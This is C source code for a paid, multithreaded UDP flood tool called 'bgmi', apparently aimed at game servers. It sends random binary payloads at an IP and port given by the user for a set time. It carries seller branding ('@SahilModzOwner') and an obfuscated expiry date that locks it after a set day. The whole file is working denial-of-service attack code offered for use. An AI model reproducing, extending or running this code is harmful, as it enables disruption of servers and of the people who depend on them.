#define _XOPEN_SOURCE 700  // Required for strptime
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>

#define ENCODED_EXPIRY_DATE { 50, 48, 50, 53, 45, 49, 50, 45, 49, 48 } // Encoded "2025-10-27
#define NUM_MSGS 10  // Number of messages to send in one batch

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

// Function to decode the expiry date
void decode_expiry_date(char *decoded_date) {
    int encoded_date[] = ENCODED_EXPIRY_DATE;
    for (int i = 0; i < 10; i++) {
        decoded_date[i] = (char)encoded_date[i];
    }
    decoded_date[10] = '\0'; // Null-terminate the string
}

// Function to check if the file has expired
int check_expiry() {
    char expiry_date[11];
    decode_expiry_date(expiry_date);

    struct tm expiry_time = {0};
    time_t current_time, expiry_timestamp;

    // Parse the expiration date
    if (strptime(expiry_date, "%Y-%m-%d", &expiry_time) == NULL) {
        fprintf(stderr, "Error parsing expiration date\n");
        return 1;
    }

    // Convert expiration time to timestamp
    expiry_timestamp = mktime(&expiry_time);

    // Get the current time
    time(&current_time);

    // Compare current time with the expiry date
    if (difftime(expiry_timestamp, current_time) <= 0) {
        printf("THIS IS A PAID FILE BY @SahilModzOwner EXPIRED ON %s.\n", expiry_date);
        return 1;
    }

    return 0;  // Not expired
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

// List of payloads
char *payloads[] = {
    "\xe3\x82\x2d\xea\x69\xad\x00\xc7\x7f\xfa\x8d\x79\xd8\x44\x85\x6b\x42\xf8\xda\x8b\x37",
    "\x14\x73\x07\x30\xa3\x43\x0f\x16\x8d\x04\xcd\x00\xb6\x32\x25\x98\xfb\xed\x25\xa5\x86",
    "\x20\x7e\xc1\x0f\x4a\xfd\x33\x65\xa3\xeb\xed\x71\x8b\xf3\x56\xd8\xa8\xeb\xf7\x99\x0c",
    "\x38\x60\xfd\x95\x87\x01\x05\xd3\xa6\x63\xcb\x8b\xf0\x47\x7d\x4f\x46\x50\x0d\xb8\xd4",
    "\x44\x58\x36\x69\xc5\xe2\x68\x2c\xdb\x62\x7e\xbe\x0e\xca\x8b\xc7\xbb\xe0\xf9\x83\x0d",
    "\x0d\xf3\x7d\xbd\x81\x05\x16\x2f\x65\xe4\xe0\x82\xf1\x76\x09\xab\xb6\xd7\x44\xa1\x7b",
    "\x10\xea\xd0\x43\xb4\x75\xc4\xbe\x6f\x41\x85\x16\x2c\xd4\xc4\xe3\x4b\x51\x20\x8b\xea",
    "\xdd\xbf\xc4\x40\x26\x66\x6e\x79\x43\x70\x84\x31\xe5\x62\x46\xb8\xf2\xfa\xa0\x51\x08",
    "\x7e\x67\x1e\xae\x49\xb6\xe0\x4b\x00\x69\xda\xdb\xae\xf2\x1f\x22\xaf\xa2\x33\x1e\xa8",
    "\xa8\x68\x1d\xa2\xdc\x8b\x68\x35\x83\x99\x47\x83\xf3\x23\xbe\x37\x75\xe9\xa6\xda\xfc",
    "\x55\x06\x7d\xb0\xdb\x3f\x37\xa7\x32\xf4\x51\xcb\x18\x6e\x6e\xb5\x3e\x12\x66\xd5\xa2",
    "\x47\x97\xb8\x60\x4c\x68\xb9\x3d\x06\x08\x51\xe5\x35\x09\xcc\x04\xcc\x16\xc7\x67\xe1",
    "\x34\xa3\x73\xb8\x25\x5b\xb6\xd4\x29\x6a\x9a\xbf\x7e\xc8\x14\x74\xfb\x5e\x56\xb1\x4e",
    "\xf1\x2a\x57\xa1\x24\x46\x0b\x85\x3a\x21\xa7\xf4\x14\x7d\x63\xd6\x92\xee\xa1\xf7\xbb",
    "\x04\x2f\x7c\x18\xa9\xed\x6a\x6f\xb9\xc9\xb2\x93\xe2\x6c\xcc\xd2\x16\xf2\x8d\xdc\x64",
    "\xe3\x4b\xc6\x4a\x31\x0d\x2e\xfc\x5b\xb0\xed\x8e\x2a\x6f\x18\x7a\x40\xd4\xda\x87\xf2\xe5\xd1\xeb\x81",
     // Add more payloads as needed
};

// Function to send packets
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Create a UDP socket (create once per thread)
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Send packets for the specified duration
    time_t endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {
        // Randomly select a payload and send it
        for (int i = 0; i < NUM_MSGS; i++) {
            int random_index = rand() % (sizeof(payloads) / sizeof(payloads[0]));
            if (sendto(sock, payloads[random_index], strlen(payloads[random_index]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Check if the file has expired
    if (check_expiry()) {
        exit(1);
    }

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Start attack threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *thread_data_copy = malloc(sizeof(struct thread_data));
        memcpy(thread_data_copy, &data, sizeof(struct thread_data));

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)thread_data_copy) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Join all attack threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished, join @SahilModz\n");
    return 0;
}
